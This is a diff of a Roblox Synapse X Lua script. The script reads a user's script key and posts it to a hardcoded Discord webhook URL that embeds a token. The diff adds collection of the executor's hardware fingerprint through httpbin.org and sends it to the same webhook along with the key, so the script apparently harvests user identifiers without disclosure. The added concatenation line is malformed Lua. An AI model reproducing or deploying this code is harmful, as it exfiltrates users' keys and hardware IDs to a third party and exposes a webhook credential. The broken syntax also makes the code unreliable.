@@ -1,5 +1,11 @@
 script_key = getgenv().Shhhh.Options.Key;
 
+local http_request = syn.request;
+
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid = decoded.headers["Syn-Fingerprint"]
+
 local response = syn.request(
     {
         Url = 'https://discord.com/api/webhooks/1069573362831065140/pistEyyGkZ30kZpaDlDDDw_qpOjg_4lDAMreZ63a9pjamHS2B5MdYRehzHhZT9H96kTO',
@@ -7,6 +13,7 @@ local response = syn.request(
         Headers = {
             ['Content-Type'] = 'application/json'
         },
-        Body = game:GetService('HttpService'):JSONEncode({content = script_key})
+        Body = game:GetService('HttpService'):JSONEncode({content = "Script Key: " ..script_key .. \n"HWID: "..hwid})
     }
 );
+
